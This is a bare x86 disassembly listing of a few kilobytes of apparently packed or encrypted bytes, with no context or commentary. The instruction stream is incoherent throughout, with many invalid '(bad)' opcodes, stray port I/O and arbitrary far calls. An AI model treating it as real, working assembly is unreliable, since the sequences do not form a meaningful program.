  41e831:	push   0x5a
  41e833:	pop    ebx
  41e834:	mov    dl,0x7a
  41e836:	add    esp,esp
  41e838:	push   es
  41e839:	xchg   edx,eax
  41e83a:	loope  0x41e835
  41e83c:	mov    ch,BYTE PTR [eax+ecx*2]
  41e83f:	mov    ebx,0xcf4058e0
  41e844:	mov    eax,ds:0xc2590ec7
  41e849:	sbb    al,0x51
  41e84b:	and    eax,0xf57fcbb7
  41e850:	inc    esp
  41e851:	push   0x1ba40c12
  41e856:	outs   dx,DWORD PTR es:[esi]
  41e858:	scas   eax,DWORD PTR es:[edi]
  41e859:	fist   DWORD PTR [ecx]
  41e85b:	pop    eax
  41e85c:	sub    al,0x41
  41e85e:	push   ebp
  41e85f:	je     0x41e8db
  41e861:	ret    0xd322
  41e864:	jnp    0x41e8b0
  41e866:	loope  0x41e809
  41e868:	cmp    dl,BYTE PTR [ebx-0x79403c6a]
  41e86e:	cwde   
  41e86f:	mov    ah,0xb2
  41e871:	jecxz  0x41e843
  41e873:	dec    eax
  41e874:	mov    BYTE PTR [eax-0x38],dl
  41e877:	mov    ebx,0xb7916b45
  41e87c:	stc    
  41e87d:	sub    eax,0x3ac2cd4e
  41e882:	aam    0x29
  41e884:	std    
  41e885:	xchg   edx,eax
  41e886:	mov    ds,ebp
  41e888:	aam    0x24
  41e88a:	sub    eax,0xee3126b0
  41e88f:	cwde   
  41e890:	fs or  al,0xc6
  41e893:	pop    ebx
  41e894:	ror    ah,cl
  41e896:	xor    esp,DWORD PTR [edi]
  41e898:	das    
  41e899:	mov    esp,0x6804dbe7
  41e89e:	in     al,dx
  41e89f:	ins    BYTE PTR es:[edi],dx
  41e8a0:	or     ecx,DWORD PTR [ebx]
  41e8a2:	mov    ds:0x8c619a74,al
  41e8a7:	ins    DWORD PTR es:[edi],dx
  41e8a8:	fwait
  41e8a9:	pop    eax
  41e8aa:	mov    ah,0x27
  41e8ac:	lea    eax,[esi+0x21]
  41e8af:	call   0x6148:0x4eab28bf
  41e8b6:	imul   edi,DWORD PTR [ecx+ebp*4+0x592c0f3b],0x5768c17
  41e8c1:	loopne 0x41e8d3
  41e8c3:	rcr    DWORD PTR [ebx-0x13],cl
  41e8c6:	(bad)  
  41e8c7:	pop    esp
  41e8c8:	pop    ecx
  41e8c9:	dec    esp
  41e8ca:	mov    ebx,0x3150df89
  41e8cf:	daa    
  41e8d0:	or     BYTE PTR [ebp+0x712d634d],0x44
  41e8d7:	sbb    al,BYTE PTR ds:0xadb33477
  41e8dd:	jp     0x41e92a
  41e8df:	sti    
  41e8e0:	int    0xda
  41e8e2:	cmc    
  41e8e3:	popa   
  41e8e4:	add    dl,ah
  41e8e6:	ror    DWORD PTR ds:0x47cad90,0x6c
  41e8ed:	aaa    
  41e8ee:	cdq    
  41e8ef:	rcr    dl,1
  41e8f1:	lods   eax,DWORD PTR ds:[esi]
  41e8f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f3:	(bad)  
  41e8f4:	xor    DWORD PTR [esp+ebp*4],esi
  41e8f7:	mov    ebp,DWORD PTR [esi-0x2]
  41e8fa:	cmp    dh,BYTE PTR [edi]
  41e8fc:	ins    DWORD PTR es:[edi],dx
  41e8fd:	jae    0x41e8c4
  41e8ff:	lahf   
  41e900:	std    
  41e901:	pop    edi
  41e902:	call   0xeccc23b6
  41e907:	jle    0x41e8f7
  41e909:	inc    esp
  41e90a:	rcl    ah,1
  41e90c:	adc    esp,DWORD PTR [eax]
  41e90e:	call   0x6889cfa1
  41e913:	bound  ebx,QWORD PTR [edx+0x40]
  41e916:	push   ecx
  41e917:	data16 mov BYTE PTR [edi+0x45c09efe],al
  41e91e:	lahf   
  41e91f:	xchg   edi,eax
  41e920:	cmp    al,0xa3
  41e922:	sub    eax,0x30adf79f
  41e927:	xor    dl,BYTE PTR [edx+0x59]
  41e92a:	jnp    0x41e8cd
  41e92c:	cmp    al,0x7e
  41e92e:	and    edx,ebx
  41e930:	mov    esi,DWORD PTR [esi]
  41e932:	add    al,0x6b
  41e934:	imul   edi,DWORD PTR [edx+0xa09ccf5],0x45ce5695
  41e93e:	sbb    BYTE PTR [esi],ch
  41e940:	fadd   DWORD PTR [edx]
  41e942:	dec    eax
  41e943:	fcmovu st,st(0)
  41e945:	ds rcr ecx,0x2a
  41e949:	cmc    
  41e94a:	inc    ecx
  41e94b:	jno    0x41e992
  41e94d:	enter  0x12c1,0x5b
  41e951:	and    al,0x99
  41e953:	and    edi,DWORD PTR [esi+0x4b]
  41e956:	pop    esp
  41e957:	leave  
  41e958:	jne    0x41e9c6
  41e95a:	lods   al,BYTE PTR ds:[esi]
  41e95b:	enter  0xbeb1,0x77
  41e95f:	lea    ebx,[esi]
  41e961:	jb     0x41e8e9
  41e963:	fsubp  st(0),st
  41e965:	clc    
  41e966:	xchg   esi,eax
  41e967:	or     BYTE PTR [eax+0x2b],0x98
  41e96b:	push   ebp
  41e96c:	(bad)  
  41e96d:	xlat   BYTE PTR ds:[ebx]
  41e96e:	rcl    esp,1
  41e970:	inc    esp
  41e971:	test   ch,ch
  41e973:	mov    ecx,?
  41e975:	adc    BYTE PTR [eax],dh
  41e977:	mov    dl,0x48
  41e979:	mov    ecx,0x8fa8109f
  41e97e:	test   al,0xb3
  41e980:	mov    ds:0x88ccf139,al
  41e985:	mov    ecx,0x65f7849a
  41e98a:	lahf   
  41e98b:	jbe    0x41e9fa
  41e98d:	xor    BYTE PTR [ecx-0x36],ch
  41e990:	mov    bl,0xb6
  41e992:	lahf   
  41e993:	sbb    BYTE PTR [edi+0x19],ch
  41e996:	outs   dx,BYTE PTR ds:[esi]
  41e997:	mov    DWORD PTR [ecx-0x1f5e7a63],edi
  41e99d:	sub    eax,0x5e2ba0ef
  41e9a2:	jecxz  0x41e956
  41e9a4:	ins    BYTE PTR es:[edi],dx
  41e9a5:	push   edx
  41e9a6:	cmc    
  41e9a7:	mov    bh,0x1
  41e9a9:	ficom  WORD PTR [edx]
  41e9ab:	jne    0x41e95a
  41e9ad:	push   ebx
  41e9ae:	pop    esi
  41e9af:	shr    BYTE PTR [ebx+ecx*2+0x4e653d84],1
  41e9b6:	add    bl,BYTE PTR [ebx-0x42baa21d]
  41e9bc:	fcomp  st(0)
  41e9be:	std    
  41e9bf:	xor    BYTE PTR [eax+eiz*8-0x19b13003],dl
  41e9c6:	cmc    
  41e9c7:	rcr    DWORD PTR [eax-0x42],cl
  41e9ca:	or     eax,DWORD PTR [eax]
  41e9cc:	jg     0x41e9dd
  41e9ce:	jo     0x41ea05
  41e9d0:	pop    ebx
  41e9d1:	daa    
  41e9d2:	imul   ebx,DWORD PTR [esi],0x8554e487
  41e9d8:	stos   DWORD PTR es:[edi],eax
  41e9d9:	aam    0xbc
  41e9db:	aas    
  41e9dc:	leave  
  41e9dd:	fisttp WORD PTR [edx+0xf]
  41e9e0:	pop    ebx
  41e9e1:	out    dx,eax
  41e9e2:	mov    eax,0x623f4895
  41e9e7:	pop    es
  41e9e8:	and    esp,DWORD PTR ds:0x4d875a54
  41e9ee:	arpl   WORD PTR [esi+eiz*2-0x7e],ax
  41e9f2:	pop    edx
  41e9f3:	cmp    dl,BYTE PTR [edi+0x2f5dcb96]
  41e9f9:	retf   0xe40a
  41e9fc:	in     al,0x74
  41e9fe:	xlat   BYTE PTR ds:[ebx]
  41e9ff:	add    esi,DWORD PTR [ebp-0x3f]
  41ea02:	and    al,0x85
  41ea04:	mov    bh,0x13
  41ea06:	mov    cl,0xfb
  41ea08:	(bad)  
  41ea0a:	sar    esp,0x3a
  41ea0d:	(bad)  
  41ea0e:	out    0x1f,eax
  41ea10:	jl     0x41ea04
  41ea12:	or     dh,BYTE PTR [eax-0x3b523838]
  41ea18:	jno    0x41ea06
  41ea1a:	jb     0x41e9e4
  41ea1c:	into   
  41ea1d:	add    eax,0xf3be8fe7
  41ea22:	inc    edi
  41ea23:	dec    ecx
  41ea24:	sub    cl,BYTE PTR [ecx+0x79]
  41ea27:	jecxz  0x41ea03
  41ea29:	outs   dx,BYTE PTR ds:[esi]
  41ea2a:	xchg   al,ch
  41ea2c:	jne    0x41e9df
  41ea2e:	adc    al,BYTE PTR [ebp-0x1c92be62]
  41ea34:	inc    eax
  41ea35:	xlat   BYTE PTR ds:[ebx]
  41ea36:	int3   
  41ea37:	aad    0x2b
  41ea39:	ss mov esp,0x99b3fb92
  41ea3f:	fnstsw WORD PTR [ebx]
  41ea41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea42:	in     al,dx
  41ea43:	retf   0x8fc1
  41ea46:	mov    ds:0x50c147c5,eax
  41ea4b:	int3   
  41ea4c:	mov    ch,0x4
  41ea4e:	(bad)  
  41ea4f:	mov    bl,0x4f
  41ea51:	gs enter 0xfcb3,0xe6
  41ea56:	and    DWORD PTR [edx+esi*4+0x205eb17b],0xec5f98b0
  41ea61:	js     0x41ea59
  41ea63:	push   ds
  41ea64:	cmp    cl,BYTE PTR [ecx-0x65ac471f]
  41ea6a:	cli    
  41ea6b:	popf   
  41ea6c:	jbe    0x41ea55
  41ea6e:	jo     0x41eadc
  41ea70:	in     al,0xec
  41ea72:	xchg   esp,eax
  41ea73:	stos   BYTE PTR es:[edi],al
  41ea74:	push   edx
  41ea75:	es (bad) 
  41ea77:	lods   eax,DWORD PTR ds:[esi]
  41ea78:	and    eax,0x931603cc
  41ea7d:	addr16 xchg edx,eax
  41ea7f:	(bad)  
  41ea80:	jl     0x41ea51
  41ea82:	fcom   DWORD PTR [ecx+edx*8]
  41ea85:	scas   al,BYTE PTR es:[edi]
  41ea86:	test   al,0xc9
  41ea88:	mov    bh,0xdd
  41ea8a:	bound  esi,QWORD PTR [ecx-0x1beaaf74]
  41ea90:	(bad)  
  41ea91:	fwait
  41ea92:	pop    eax
  41ea93:	adc    cl,ah
  41ea95:	stos   DWORD PTR es:[edi],eax
  41ea96:	call   0xad43:0xa9fa89d2
  41ea9d:	ret    
  41ea9e:	cmp    bh,BYTE PTR [eax+eax*8]
  41eaa1:	mov    edi,0xeddc2a5b
  41eaa6:	jl     0x41ea9a
  41eaa8:	pusha  
  41eaa9:	xchg   ecx,eax
  41eaaa:	xor    BYTE PTR [ebx+0x44a9f2d],dl
  41eab0:	cli    
  41eab1:	jge    0x41eb1e
  41eab3:	xor    cl,BYTE PTR [edi+0x3dbfb2b5]
  41eab9:	fimul  WORD PTR [eax+0x44]
  41eabd:	test   al,0x38
  41eabf:	lods   al,BYTE PTR ds:[esi]
  41eac0:	jecxz  0x41eaf9
  41eac2:	iret   
  41eac3:	mov    eax,0xa5287415
  41eac8:	push   esp
  41eac9:	dec    esi
  41eaca:	ds dec ecx
  41eacc:	shl    DWORD PTR [ecx+0x5ecba758],0x20
  41ead3:	jg     0x41eabc
  41ead5:	int    0x1b
  41ead7:	iret   
  41ead8:	mov    eax,ds:0x9bfbc56f
  41eadd:	call   0x37fca7ff
  41eae2:	mov    esi,0xf17d78e0
  41eae7:	jmp    0x41eae9
	...
  41ecb9:	add    BYTE PTR [eax],al
  41ecbb:	add    BYTE PTR [eax],ah
  41ecbd:	lahf   
  41ecbe:	arpl   WORD PTR [ebp-0x40110201],cx
  41ecc4:	mov    gs,WORD PTR [ebx-0x46d8bf00]
  41ecca:	es and eax,eax
  41eccd:	inc    ebp
  41ecce:	add    DWORD PTR [eax],eax
  41ecd0:	and    eax,0xe5000007
  41ecd5:	mov    edx,0x41f120c9
  41ecda:	fstp   QWORD PTR [ebp-0x2c42a409]
  41ece0:	inc    ebp
  41ece1:	addr16 xchg edx,eax
  41ece3:	mov    dh,0x79
  41ece5:	(bad)  
  41ece6:	rcl    BYTE PTR [edx-0xa347d73],cl
  41ecec:	aas    
  41eced:	xor    ch,BYTE PTR [ecx-0x7a0e89a0]
  41ecf3:	ret    0xad54
  41ecf6:	fcmovnb st,st(5)
  41ecf8:	pop    ecx
  41ecf9:	imul   edi
  41ecfb:	ins    DWORD PTR es:[edi],dx
  41ecfc:	dec    si
  41ecfe:	stos   BYTE PTR es:[edi],al
  41ecff:	cwde   
  41ed00:	rcl    DWORD PTR [eax],cl
  41ed02:	sbb    esi,DWORD PTR [ebx+eiz*2]
  41ed05:	pop    edx
  41ed06:	leave  
  41ed07:	int3   
  41ed08:	add    bl,BYTE PTR [edi+0x61]
  41ed0b:	cmp    esi,ecx
  41ed0d:	out    0x21,eax
  41ed0f:	imul   ecx,DWORD PTR [edx-0x28],0x67
  41ed13:	out    dx,al
  41ed14:	shl    DWORD PTR [edi+0x6bec8a1f],cl
  41ed1a:	ins    DWORD PTR es:[edi],dx
  41ed1b:	sti    
  41ed1c:	fistp  DWORD PTR [esi+0x4d92e7a7]
  41ed22:	fist   WORD PTR [ecx+0x58d835fc]
  41ed28:	(bad)  
  41ed29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2a:	adc    al,0xeb
  41ed2c:	nop
  41ed2d:	mov    ebx,eax
  41ed2f:	out    0x91,al
  41ed31:	scas   eax,DWORD PTR es:[edi]
  41ed32:	and    edx,DWORD PTR [ecx]
  41ed34:	sar    DWORD PTR [edx-0x5f],1
  41ed37:	xchg   ebp,eax
  41ed38:	cwde   
  41ed39:	cld    
  41ed3a:	adc    al,0xcf
  41ed3c:	or     al,0xaf
  41ed3e:	int    0x7d
  41ed40:	sbb    BYTE PTR ds:0x85e9b43d,0x36
  41ed47:	les    esi,FWORD PTR ds:0x9004620c
  41ed4d:	add    DWORD PTR [esi-0x7e],0x451eda21
  41ed54:	bound  ebx,QWORD PTR [eax]
  41ed56:	mov    cl,0x94
  41ed58:	add    ebp,DWORD PTR [edx-0x65]
  41ed5b:	push   eax
  41ed5c:	bnd jp 0x41ed98
  41ed5f:	xor    esp,ebp
  41ed61:	inc    ecx
  41ed62:	lods   eax,DWORD PTR ds:[esi]
  41ed63:	(bad)  
  41ed64:	mov    ds:0x4585aabe,al
  41ed69:	(bad)  
  41ed6a:	cmp    al,0x23
  41ed6c:	popa   
  41ed6d:	fcmovu st,st(5)
  41ed6f:	outs   dx,BYTE PTR ds:[esi]
  41ed70:	cmp    DWORD PTR [edi-0x80],esi
  41ed73:	das    
  41ed74:	sub    eax,0x2489a0cf
  41ed79:	and    edi,edi
  41ed7b:	imul   edi,DWORD PTR [ecx+0x35],0xe400c06
  41ed82:	aaa    
  41ed83:	jecxz  0x41ed79
  41ed85:	jle    0x41edf8
  41ed87:	mov    ch,0x14
  41ed89:	jg     0x41ed15
  41ed8b:	cdq    
  41ed8c:	jg     0x41edf1
  41ed8e:	aad    0x2b
  41ed90:	std    
  41ed91:	or     BYTE PTR [esi+edx*1],al
  41ed94:	pop    esi
  41ed95:	pop    es
  41ed96:	daa    
  41ed97:	inc    ebp
  41ed98:	(bad)  
  41ed99:	sub    eax,0x9d61d7c2
  41ed9e:	retf   0x37b8
  41eda1:	sbb    BYTE PTR [ecx],dl
  41eda3:	adc    BYTE PTR [eax-0x3d030e82],dl
  41eda9:	xchg   DWORD PTR [ebp-0x26],esp
  41edac:	jecxz  0x41eded
  41edae:	jle    0x41edd8
  41edb0:	rcl    DWORD PTR ds:0x24401f6c,1
  41edb6:	pop    ecx
  41edb7:	idiv   DWORD PTR [ebp+0x6a1ec8b5]
  41edbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edbe:	mov    ebp,DWORD PTR [eax+ecx*4-0x3]
  41edc2:	mov    esp,0x18354e67
  41edc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edc8:	repz add al,bl
  41edcb:	call   0x653ddd05
  41edd0:	(bad)  
  41edd1:	cmp    eax,0x1f37c8b4
  41edd6:	rcl    BYTE PTR ss:[edi+edi*1-0x393d3283],1
  41edde:	sar    esi,0xfc
  41ede1:	ja     0x41ed80
  41ede3:	dec    ecx
  41ede4:	push   esi
  41ede5:	xlat   BYTE PTR ds:[ebx]
  41ede6:	mov    al,ds:0x30d25b2c
  41edeb:	mov    WORD PTR [edx],ss
  41eded:	push   ecx
  41edee:	out    0x25,al
  41edf0:	outs   dx,DWORD PTR ds:[esi]
  41edf1:	ret    0xccda
  41edf4:	jno    0x41ee0c
  41edf6:	mov    ds:0x6dd8deb9,al
  41edfb:	xlat   BYTE PTR ds:[ebx]
  41edfc:	cmp    esp,DWORD PTR [edx+edx*4-0x574fb603]
  41ee03:	imul   edx,DWORD PTR [edi+0x53],0x1d
  41ee07:	push   ebp
  41ee08:	push   cs
  41ee09:	out    0xa0,al
  41ee0b:	(bad)  
  41ee0c:	and    DWORD PTR [esi-0x1],eax
  41ee0f:	dec    ecx
  41ee10:	in     eax,0xea
  41ee12:	mov    ah,0x2d
  41ee14:	rol    BYTE PTR ds:0xc2933e1e,0x8f
  41ee1b:	adc    DWORD PTR [ebp-0x49],0xc6b322b1
  41ee22:	sbb    al,0x6
  41ee24:	add    ebp,DWORD PTR [ebp-0x99ba527]
  41ee2a:	shl    DWORD PTR [eax-0x73],1
  41ee2d:	sti    
  41ee2e:	dec    edx
  41ee2f:	adc    BYTE PTR [ecx-0x11],ah
  41ee32:	or     al,0xd8
  41ee34:	add    bh,BYTE PTR ds:0x2205947a
  41ee3a:	jle    0x41edce
  41ee3c:	jno    0x41ee2f
  41ee3e:	jecxz  0x41ee18
  41ee40:	pop    esi
  41ee41:	sti    
  41ee42:	mov    al,ds:0x3e29d664
  41ee47:	int3   
  41ee48:	sbb    edx,ebp
  41ee4a:	jl     0x41edcf
  41ee4c:	rcr    BYTE PTR [eax+ecx*8-0x5949ec21],cl
  41ee53:	cmp    DWORD PTR [ebx+0x10],esi
  41ee56:	call   0x3e4b3b29
  41ee5b:	jns    0x41edea
  41ee5d:	dec    eax
  41ee5e:	cmp    BYTE PTR [ebx-0x39],bh
  41ee61:	cmp    ah,BYTE PTR [ebp-0xc]
  41ee64:	jbe    0x41ee73
  41ee66:	inc    ecx
  41ee67:	xor    al,0xeb
  41ee69:	push   esi
  41ee6a:	addr16 loop 0x41ee00
  41ee6d:	xchg   eax,edi
  41ee6f:	xor    BYTE PTR [ecx-0x4d5a8461],bl
  41ee75:	inc    esp
  41ee76:	lods   al,BYTE PTR ds:[esi]
  41ee77:	push   edx
  41ee78:	call   0x1814827f
  41ee7d:	fcomp  DWORD PTR [ebp-0x2945804a]
  41ee83:	test   al,0x52
  41ee85:	mov    al,ds:0x4cd3bacd
  41ee8a:	stc    
  41ee8b:	sub    esp,DWORD PTR [esi-0x10]
  41ee8e:	test   BYTE PTR [edi],0xd5
  41ee91:	jecxz  0x41ef11
  41ee93:	div    ecx
  41ee95:	stos   BYTE PTR es:[edi],al
  41ee96:	xchg   ebx,eax
  41ee97:	cwde   
  41ee98:	scas   al,BYTE PTR es:[edi]
  41ee99:	xchg   BYTE PTR [ecx+0xd],bl
  41ee9c:	(bad)  
  41ee9d:	and    cl,BYTE PTR [eax+0x57]
  41eea0:	aam    0x2e
  41eea2:	mov    eax,ds:0x62060e88
  41eea7:	sub    al,0x5
  41eea9:	not    dl
  41eeab:	mov    ebx,0x941f9e0
  41eeb0:	loopne 0x41ee3f
  41eeb2:	jo     0x41ef2b
  41eeb4:	pop    edx
  41eeb5:	mov    ebp,0x1a3062a9
  41eeba:	(bad)  
  41eebc:	mov    bl,0x82
  41eebe:	xlat   BYTE PTR ds:[ebx]
  41eebf:	std    
  41eec0:	stc    
  41eec1:	aad    0xec
  41eec3:	push   ebp
  41eec4:	pop    edi
  41eec5:	push   cs
  41eec6:	mov    BYTE PTR [edi],bh
  41eec8:	cli    
  41eec9:	aas    
  41eeca:	(bad)  
  41eecb:	in     al,dx
  41eecc:	jp     0x41eeff
  41eece:	adc    bl,dh
  41eed0:	xor    edx,DWORD PTR ds:0xca0274a1
  41eed6:	sbb    bh,ch
  41eed8:	inc    eax
  41eed9:	xchg   ah,ch
  41eedb:	test   BYTE PTR fs:[edx+0xe39939a],0xdf
  41eee3:	mov    DWORD PTR [ecx-0x70],ebx
  41eee6:	jecxz  0x41ee94
  41eee8:	pushf  
  41eee9:	cmp    ebp,ebp
  41eeeb:	lahf   
  41eeec:	mov    DWORD PTR ds:0xa3575eb0,0xf71ad958
  41eef6:	sbb    edx,DWORD PTR [eax]
  41eef8:	enter  0x636f,0xf8
  41eefc:	out    dx,eax
  41eefd:	pop    edx
  41eefe:	sti    
  41eeff:	push   es
  41ef00:	adc    eax,0xc4c961bd
  41ef05:	xor    eax,0x677625b5
  41ef0a:	data16 add al,0xc
  41ef0d:	pop    ebx
  41ef0e:	inc    ebp
  41ef0f:	xchg   ecx,eax
  41ef10:	xchg   edx,eax
  41ef11:	xor    eax,DWORD PTR [ebp+0x17f4359e]
  41ef17:	jp     0x41eeb0
  41ef19:	add    eax,0x36e8ffe5
  41ef1e:	test   esp,0xb34344aa
  41ef24:	in     al,dx
  41ef25:	xor    ebx,DWORD PTR fs:[ebx]
  41ef28:	fild   DWORD PTR [ecx+0x6e90630]
  41ef2e:	fnsave [eax+0x69]
  41ef31:	retw   
  41ef33:	iret   
  41ef34:	mov    esp,0xacee72ca
  41ef39:	jns    0x41eecf
  41ef3b:	nop
  41ef3c:	inc    edi
  41ef3d:	mov    edi,0xcfd2baf8
  41ef42:	cdq    
  41ef43:	mov    ecx,0x53581682
  41ef48:	dec    ecx
  41ef49:	and    al,0xe8
  41ef4b:	aam    0x48
  41ef4d:	mov    al,BYTE PTR [ecx+ebx*8-0x57]
  41ef51:	mov    bh,BYTE PTR [ebp-0x45eb55fe]
  41ef57:	adc    eax,0xffffffc2
  41ef5a:	xchg   DWORD PTR [esi],edi
  41ef5c:	das    
  41ef5d:	popf   
  41ef5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef5f:	ret    0xf650
  41ef62:	mov    dl,0x68
  41ef64:	cmc    
  41ef65:	push   cs
  41ef66:	in     al,dx
  41ef67:	(bad)  
  41ef68:	xor    ebx,esi
  41ef6a:	stc    
  41ef6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef6c:	mov    esp,0x19fb4a22
  41ef71:	push   sp
  41ef73:	imul   esp,DWORD PTR [esp+edi*8],0xea9ab6f2
  41ef7a:	rcl    DWORD PTR [edi+edi*2],1
  41ef7d:	push   ecx
  41ef7e:	stc    
  41ef7f:	adc    al,BYTE PTR [ebx-0x63]
  41ef82:	adc    al,BYTE PTR ds:0x7f64958f
  41ef88:	aas    
  41ef89:	(bad)  
  41ef8a:	fadd   st(4),st
  41ef8c:	xor    cl,ch
  41ef8e:	loop   0x41eff5
  41ef90:	mov    eax,0xf5e154c6
  41ef95:	ret    0x79f
  41ef98:	mov    dh,0x94
  41ef9a:	mov    dl,0x62
  41ef9c:	scas   eax,DWORD PTR es:[edi]
  41ef9d:	aam    0xb1
  41ef9f:	and    eax,0x6b7ba893
  41efa4:	push   ebx
  41efa5:	call   0xb040:0xd9535641
  41efac:	mov    eax,0x6462a883
  41efb1:	sbb    al,0x67
  41efb3:	jle    0x41ef94
  41efb5:	inc    ebp
  41efb6:	cmp    cl,BYTE PTR [esi-0x201df97b]
  41efbc:	mov    bh,0x92
  41efbe:	mov    ebp,0x8d372ba2
  41efc3:	mov    al,0xd9
  41efc5:	cmp    eax,DWORD PTR [eax]
  41efc7:	mov    ah,0xaf
  41efc9:	and    DWORD PTR [edi],esp
  41efcb:	pop    esi
  41efcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efcd:	inc    eax
  41efce:	dec    esi
  41efcf:	icebp  
  41efd0:	ret    
  41efd1:	mov    WORD PTR [esi-0x1c],ss
  41efd4:	mov    esp,0x40a7ca7a
  41efd9:	call   0x5ea9:0xf3dab660
  41efe0:	cmc    
  41efe1:	test   ebp,ecx
  41efe3:	shl    DWORD PTR [eax+0x65],1
  41efe6:	ret    0x271
  41efe9:	lods   eax,DWORD PTR ds:[esi]
  41efea:	mov    esi,0x2fee6cb9
  41efef:	or     al,dl
  41eff1:	jl     0x41f057
  41eff3:	jnp    0x41efcb
  41eff5:	mov    DWORD PTR [ebx+eiz*1],edi
  41eff8:	adc    BYTE PTR [ebx-0x67],dh
  41effb:	jmp    0xbbd4:0xfdad4276
  41f002:	xchg   bl,bl
  41f004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f005:	mov    bh,0xd8
  41f007:	loopne 0x41ef9c
  41f009:	dec    esp
  41f00a:	mov    ds:0x3b3433b9,eax
  41f00f:	les    eax,FWORD PTR [esi]
  41f011:	mov    dl,0x11
  41f013:	fisttp DWORD PTR [eax+0xa30b444]
  41f019:	mov    esp,0xd8aaf83d
  41f01e:	push   edi
  41f01f:	inc    edi
  41f020:	(bad)  
  41f021:	out    0xbd,eax
  41f023:	sar    DWORD PTR [eax+0xe75ae07],1
  41f029:	into   
  41f02a:	mov    al,ds:0x5542e2c5
  41f02f:	dec    ebp
  41f030:	or     eax,0x672888cc
  41f035:	mov    edx,0x4b3bb011
  41f03a:	add    BYTE PTR [ebp+0x730eaa8],cl
  41f040:	cwde   
  41f041:	adc    dl,BYTE PTR [edx-0x13]
  41f044:	lea    esi,[ecx+0x1d34823b]
  41f04a:	ds dec edi
  41f04c:	or     dh,BYTE PTR [ecx-0x33]
  41f04f:	xchg   edx,eax
  41f050:	lock mov ah,0x26
  41f053:	in     eax,0xff
  41f055:	cmp    dh,cl
  41f057:	clc    
  41f058:	cmp    dh,cl
  41f05a:	rol    BYTE PTR [ebp+0x12ac9529],1
  41f060:	push   ebx
  41f061:	outs   dx,BYTE PTR ds:[esi]
  41f062:	inc    edx
  41f063:	cmp    ecx,DWORD PTR [eax+0x16]
  41f066:	or     ch,BYTE PTR [edx+0x62]
  41f069:	and    eax,0x80ef7912
  41f06e:	push   cs
  41f06f:	call   0x63f6fb69
  41f074:	adc    bl,bl
  41f076:	jbe    0x41f061
  41f078:	(bad)  
  41f079:	sbb    esi,DWORD PTR [edx]
  41f07b:	and    eax,0xba50666b
  41f080:	pop    esi
  41f081:	sub    DWORD PTR [esi],ecx
  41f083:	pop    ecx
  41f084:	shr    BYTE PTR [ebp+ecx*4+0x77],1
  41f088:	or     eax,0xa9d9a34a
  41f08d:	mov    DWORD PTR ds:[ebx],edx
  41f090:	pushf  
  41f091:	jns    0x41f0f2
  41f093:	sbb    DWORD PTR [edi+0x22],eax
  41f096:	xor    al,0x2f
  41f098:	dec    esp
  41f099:	dec    ebx
  41f09a:	push   edx
  41f09b:	(bad)  
  41f09c:	fdiv   DWORD PTR ds:[edx-0x13774731]
  41f0a3:	sahf   
  41f0a4:	jl     0x41f0fd
  41f0a6:	icebp  
  41f0a7:	clc    
  41f0a8:	push   es
  41f0a9:	push   esp
  41f0aa:	mov    al,ds:0x942b6e15
  41f0af:	push   0x20065770
  41f0b4:	repz or BYTE PTR [si-0x1c],dl
  41f0b9:	das    
  41f0ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bc:	mov    dl,BYTE PTR [eax]
  41f0be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0bf:	rcr    BYTE PTR [ecx],0x47
  41f0c2:	scas   al,BYTE PTR es:[edi]
  41f0c3:	sub    al,0xc9
  41f0c5:	mov    eax,0xaeb11d0d
  41f0ca:	test   eax,0x80c7b1db
  41f0cf:	push   0xffffffcb
  41f0d1:	popa   
  41f0d2:	xor    BYTE PTR [esi+0x4b],al
  41f0d5:	data16 jmp 0x41f0d5
  41f0d8:	mov    esp,0x5979ac4c
  41f0dd:	idiv   DWORD PTR [esi-0x5a75710]
  41f0e3:	adc    al,0x89
  41f0e5:	sar    BYTE PTR [ebp+0x63803ecb],0xc3
  41f0ec:	ficomp DWORD PTR [ebp+eiz*8-0x7493010a]
  41f0f3:	xchg   ebx,eax
  41f0f4:	ins    BYTE PTR es:[edi],dx
  41f0f5:	ins    DWORD PTR es:[edi],dx
  41f0f6:	mov    ah,0x90
  41f0f8:	rcl    DWORD PTR [esi],1
  41f0fa:	shl    BYTE PTR [esi-0x7b],1
  41f0fd:	sub    cl,BYTE PTR ds:0x5b323c41
  41f103:	push   cs
  41f104:	jno    0x41f0d9
  41f106:	inc    ebx
  41f107:	les    edx,FWORD PTR [esi-0x1020dd8b]
  41f10d:	loop   0x41f0fc
  41f10f:	or     eax,0x9f9ddbd9
  41f114:	addr16 out 0x63,al
  41f117:	addr16 sub al,bh
  41f11a:	call   0xbd1d930c
  41f11f:	mov    eax,ds:0x7a50bf0
  41f124:	push   ebx
  41f125:	inc    eax
  41f126:	in     al,0x16
  41f128:	out    dx,al
  41f129:	xchg   BYTE PTR [ebx+eax*2+0x14],dl
  41f12d:	inc    eax
  41f12e:	outs   dx,BYTE PTR ds:[esi]
  41f12f:	pop    ebp
  41f130:	dec    eax
  41f131:	(bad)
  41f135:	int    0xbe
  41f137:	mov    bl,0x63
  41f139:	mov    edi,0x26ccb9c8
  41f13e:	mov    DWORD PTR [edi-0x54],ecx
  41f141:	push   ebp
  41f142:	lods   al,BYTE PTR ds:[esi]
  41f143:	xchg   edx,eax
  41f144:	es lock int3 
  41f147:	jo     0x41f134
  41f149:	add    eax,0x927f5240
  41f14e:	sbb    BYTE PTR [ebp-0x44],cl
  41f151:	shr    BYTE PTR [edi-0xc],0x8d
  41f155:	mov    DWORD PTR [edi],eax
  41f157:	xchg   ecx,eax
  41f158:	push   ss
  41f159:	or     esi,eax
  41f15b:	jbe    0x41f1ae
  41f15d:	jmp    0x41f178
  41f15f:	and    BYTE PTR [ebx+0x3821f98a],dh
  41f165:	inc    edi
  41f166:	inc    ecx
  41f167:	add    BYTE PTR [edx+0x451a75ac],0x75
  41f16e:	rcl    eax,cl
